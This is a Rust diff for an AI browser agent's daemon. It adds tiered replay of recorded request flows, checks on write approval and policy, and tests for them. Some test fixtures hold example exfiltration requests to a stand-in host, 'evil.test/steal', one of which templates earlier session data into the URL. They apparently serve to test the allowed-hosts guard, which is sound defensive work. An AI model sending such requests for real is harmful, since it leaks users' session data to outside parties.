@@ -12122,6 +12122,18 @@ fn unconfirmed_flow_write(
 async fn handle_flow_run(
     cmd: &Value,
     state: &mut DaemonState,
+    flow: super::flow::Flow,
+) -> Result<Value, String> {
+    // Commands a run sends to the browser are not part of the recording.
+    state.flow.set_suspended(true);
+    let result = handle_flow_run_inner(cmd, state, flow).await;
+    state.flow.set_suspended(false);
+    result
+}
+
+async fn handle_flow_run_inner(
+    cmd: &Value,
+    state: &mut DaemonState,
     mut flow: super::flow::Flow,
 ) -> Result<Value, String> {
     let started = std::time::Instant::now();
@@ -12156,7 +12168,13 @@ async fn handle_flow_run(
     }
     let client = super::flow::http_client(filter.clone(), &flow)?;
     let results = {
-        let mut sender = HttpSender { state, client };
+        let mut senders = DaemonSenders {
+            wiring: FlowWiring::new(state, &allow),
+            client,
+            flow: &flow,
+            params: &params,
+            replay_run: None,
+        };
         let check = |req: &super::flow::PreparedRequest| -> Result<(), String> {
             hosts
                 .check(&req.url)
@@ -12168,7 +12186,7 @@ async fn handle_flow_run(
                 None => Ok(()),
             }
         };
-        super::flow::run_requests(&requests, &mut sender, &check).await?
+        super::flow::run_requests(&flow, &requests, &mut senders, &check).await?
     };
 
     if let Some(outcome) = super::flow::RunOutcome::stopped(&results) {
@@ -12301,27 +12319,166 @@ async fn flow_routed_response(
     })
 }
 
-/// Sends a flow's requests directly, with the session's cookies and routes.
-struct HttpSender<'a> {
+async fn flow_ensure_browser(state: &mut DaemonState) -> Result<(), String> {
+    if state.browser.is_none() {
+        auto_launch(state, Vec::new()).await?;
+        state.webmcp_enabled = state.settings.webmcp();
+    }
+    Ok(())
+}
+
+/// A write only the command replay sends: the policy file can deny it, and
+/// it needs `--allow-write` or a confirmation like any other write.
+fn replay_write_approved(
+    state: &DaemonState,
+    allow: &super::flow::AllowWrite,
+    write: &super::flow::Write,
+) -> Result<(), String> {
+    let action = write.action();
+    let confirmed = state.confirmed_policy_actions.contains(&action);
+    if let Some(policy) = state.policy.as_ref() {
+        match policy.check(&action) {
+            PolicyResult::Allow => {}
+            PolicyResult::Deny(reason) => return Err(format!("denied by policy: {}", reason)),
+            PolicyResult::RequiresConfirmation if !confirmed => {
+                return Err("the policy requires confirmation".to_string())
+            }
+            PolicyResult::RequiresConfirmation => {}
+        }
+    }
+    if !confirmed
+        && state
+            .confirm_actions
+            .as_ref()
+            .is_some_and(|ca| ca.requires_confirmation(&action))
+    {
+        return Err("--confirm-actions requires confirmation".to_string());
+    }
+    if allow.covers(&write.id) || confirmed {
+        Ok(())
+    } else {
+        Err(format!("rerun with --allow-write {} to allow it", write.id))
+    }
+}
+
+/// The daemon behind the flow ports: the browser session, its cookies and
+/// routes, and the commands a replay runs.
+struct FlowWiring<'a> {
     state: &'a mut DaemonState,
-    client: reqwest::Client,
+    allow: &'a super::flow::AllowWrite,
+    started_har: bool,
+}
+
+impl<'a> FlowWiring<'a> {
+    fn new(state: &'a mut DaemonState, allow: &'a super::flow::AllowWrite) -> Self {
+        FlowWiring {
+            state,
+            allow,
+            started_har: false,
+        }
+    }
 }
 
 #[async_trait::async_trait]
-impl super::flow::Sender for HttpSender<'_> {
-    async fn send(&mut self, req: &super::flow::PreparedRequest) -> super::flow::RequestResult {
-        let cookie = match self.state.browser.as_ref() {
-            Some(mgr) => match mgr.active_session_id() {
-                Ok(sid) => cookies::get_cookies(&mgr.client, sid, Some(vec![req.url.clone()]))
-                    .await
-                    .ok()
-                    .map(|c| super::flow::cookie_header(&c)),
-                Err(_) => None,
-            },
+impl super::flow::Browser for FlowWiring<'_> {
+    async fn cookie_header(&mut self, url: &str) -> Option<String> {
+        let mgr = self.state.browser.as_ref()?;
+        let sid = mgr.active_session_id().ok()?;
+        cookies::get_cookies(&mgr.client, sid, Some(vec![url.to_string()]))
+            .await
+            .ok()
+            .map(|c| super::flow::cookie_header(&c))
+    }
+
+    async fn routed_response(&mut self, url: &str) -> Option<super::flow::RoutedResponse> {
+        flow_routed_response(self.state, url).await
+    }
+
+    async fn tab_url(&mut self) -> Option<String> {
+        match self.state.browser.as_ref() {
+            Some(mgr) => mgr.get_url().await.ok(),
             None => None,
-        };
-        let routed = flow_routed_response(self.state, &req.url).await;
-        super::flow::run_http(&self.client, req, cookie.as_deref(), routed).await
+        }
+    }
+
+    async fn eval(&mut self, script: &str) -> Result<Value, String> {
+        match self.state.browser.as_ref() {
+            Some(mgr) => mgr.evaluate(script, None).await,
+            None => Err("Browser not launched".to_string()),
+        }
+    }
+
+    async fn ensure_browser(&mut self) -> Result<(), String> {
+        flow_ensure_browser(self.state).await
+    }
+
+    async fn begin_capture(&mut self) -> Result<usize, String> {
+        self.started_har = !self.state.har_recording;
+        if self.started_har {
+            handle_har_start(&json!({}), self.state).await?;
+        }
+        Ok(self.state.har_entries.len())
+    }
+
+    async fn run(&mut self, cmd: &Value) -> Value {
+        Box::pin(execute_command(cmd, self.state)).await
+    }
+
+    async fn captured_since(&mut self, mark: usize) -> Vec<HarEntry> {
+        let _ = self.state.drain_cdp_events_background().await;
+        self.state.har_entries[mark.min(self.state.har_entries.len())..].to_vec()
+    }
+
+    async fn end_capture(&mut self) {
+        if self.started_har {
+            self.state.har_recording = false;
+            self.state.har_entries.clear();
+            self.state.har_body_total_bytes = 0;
+        }
+    }
+
+    fn write_approved(&self, write: &super::flow::Write) -> Result<(), String> {
+        replay_write_approved(self.state, self.allow, write)
+    }
+}
+
+/// One sender per tier over the same daemon wiring.
+struct DaemonSenders<'a> {
+    wiring: FlowWiring<'a>,
+    client: reqwest::Client,
+    flow: &'a super::flow::Flow,
+    params: &'a [(String, String)],
+    replay_run: Option<super::flow::ReplayRun>,
+}
+
+#[async_trait::async_trait]
+impl super::flow::Senders for DaemonSenders<'_> {
+    async fn send(
+        &mut self,
+        tier: super::flow::Tier,
+        req: &super::flow::PreparedRequest,
+        ctx: &super::flow::SendCtx<'_>,
+    ) -> super::flow::TierResult {
+        use super::flow::{http, page, replay, Tier};
+        match tier {
+            Tier::Http => http::send(&self.client, &mut self.wiring, req).await,
+            Tier::Page => page::send(self.flow, &mut self.wiring, req).await,
+            Tier::Replay => {
+                replay::send(
+                    self.flow,
+                    self.params,
+                    &mut self.wiring,
+                    &mut self.replay_run,
+                    req,
+                    ctx,
+                )
+                .await
+            }
+        }
+    }
+
+    fn replay_ran(&self) -> bool {
+        self.replay_run.is_some()
     }
 }
 
@@ -19530,7 +19687,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "version": 1, "name": "edited", "origin": "example.com",
             "startUrl": "https://example.com/", "allowedHosts": ["example.com"],
             "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
-            "steps": [{ "seq": 1, "requests": [{
+            "steps": [{ "seq": 1, "ok": true, "command": { "action": "navigate" }, "requests": [{
                 "id": "s1r1", "method": "GET", "url": "https://evil.test/steal",
                 "headers": {}, "body": null,
                 "expect": { "status": 200, "mime": "application/json", "signature": {}, "bytes": 2, "itemFields": [], "extract": null }
@@ -19564,7 +19721,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
             "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
             "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
-            "steps": [{ "seq": 1, "requests": [{
+            "steps": [{ "seq": 1, "ok": true, "command": { "action": "click" }, "requests": [{
                 "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
                 "expect": { "status": 200, "mime": "application/json",
                     "signature": super::super::flow::signature(&json!({ "ok": true })),
@@ -19706,7 +19863,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             assert_eq!(resp["success"], false, "{resp}");
             assert!(resp["error"].as_str().unwrap().contains(expect), "{resp}");
             assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
-            assert!(state.browser.is_none());
+            assert!(state.browser.is_none(), "no lower tier ran");
             if response.is_empty() {
                 assert_eq!(resp["code"], "outcome_unknown");
             }
@@ -19767,6 +19924,113 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
         assert_eq!(resp["success"], false, "{resp}");
         assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
         assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn the_replay_does_not_send_a_write_that_was_not_allowed() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let flow = json!({
+            "version": 1, "name": "buy", "origin": "127.0.0.1",
+            "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
+            "steps": [
+                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
+                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
+                    "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
+                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
+                }] }
+            ]
+        });
+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let resp = execute_command(&json!({ "id": "r", "action": "flow_run", "name": "buy", "params": {}, "allowWrite": "false" }), &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        let error = resp["error"].as_str().unwrap();
+        assert!(error.contains("s1w1") && error.contains("allow"), "{error}");
+        assert!(
+            state.browser.is_none(),
+            "no browser launched, so no click ran"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_write_sent_by_one_tier_is_not_sent_again_by_the_replay() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let (port, hits) = serve_counting(
+            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
+        );
+        let base = format!("http://127.0.0.1:{}", port);
+        let sig = super::super::flow::signature(&json!({ "ok": true }));
+        let expect = json!({ "status": 200, "mime": "application/json", "signature": sig, "bytes": 11, "itemFields": [], "extract": null });
+        let flow = json!({
+            "version": 1, "name": "twice", "origin": "127.0.0.1",
+            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "kind": "explicit", "step": 1 }],
+            "steps": [
+                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#add" }, "requests": [{
+                    "id": "s1r1", "method": "POST", "url": format!("{}/api/cart", base), "headers": {}, "body": "{}", "expect": expect }] },
+                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
+                    "id": "s2r1", "method": "GET", "url": format!("{}/api/items?c={{{{@s1r1.ok}}}}", base), "headers": {}, "body": null,
+                    "tier": "replay", "expect": expect }] }
+            ]
+        });
+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let run = json!({ "id": "r", "action": "flow_run", "name": "twice", "params": {}, "allowWrite": "all" });
+        let resp = execute_command(&run, &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        assert!(resp["error"].as_str().unwrap().contains("again"), "{resp}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
+        assert!(state.browser.is_none(), "the replay never started");
+    }
+
+    #[tokio::test]
+    async fn a_rejected_write_with_stripped_credentials_still_reaches_the_replay() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let (port, hits) = serve_counting(
+            "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
+        );
+        let base = format!("http://127.0.0.1:{}", port);
+        let url = format!("{}/api/cart", base);
+        let flow = json!({
+            "version": 1, "name": "rejected", "origin": "127.0.0.1",
+            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
+            "steps": [
+                // A script command keeps the replay from running a browser.
+                { "seq": 1, "ok": true, "command": { "action": "evaluate", "script": "1" }, "requests": [{
+                    "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
+                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "ok": true })),
+                        "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true } }] }
+            ]
+        });
+        save_flow_json(flow);
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let run = json!({ "id": "r", "action": "flow_run", "name": "rejected", "params": {}, "allowWrite": "all" });
+        let resp = execute_command(&run, &mut state).await;
+        assert_eq!(resp["success"], false, "{resp}");
+        let error = resp["error"].as_str().unwrap();
+        assert!(
+            error.contains("not allowed in a replay"),
+            "the replay was reached: {error}"
+        );
+        assert!(!error.contains("already sent"), "{error}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
     }
 
     #[tokio::test]
@@ -19836,9 +20100,9 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
             "output": "s2r1",
             "steps": [
-                { "requests": [{ "id": "s1r1", "method": "GET",
+                { "command": {}, "requests": [{ "id": "s1r1", "method": "GET",
                     "url": format!("{}/session", base), "expect": expect }] },
-                { "requests": [{ "id": "s2r1", "method": "GET",
+                { "command": {}, "requests": [{ "id": "s2r1", "method": "GET",
                     "url": "http://evil.test/steal?c={{@s1r1.ok}}", "expect": expect }] }
             ]
         }));
@@ -19912,11 +20176,15 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             assert_eq!(resp["data"]["status"], kind);
             let error = resp["error"].as_str().unwrap();
             assert!(error.starts_with(kind), "{error}");
-            assert!(error.contains("step 1"), "{error}");
+            assert!(
+                error.contains("(http)"),
+                "stopped on the first tier: {error}"
+            );
             if !retry.is_empty() {
                 assert_eq!(resp["data"]["retryAfter"], retry);
                 assert!(error.contains("retry after 17"), "{error}");
             }
+            // No lower tier ran, so no browser was opened.
             assert!(state.browser.is_none());
         }
     }
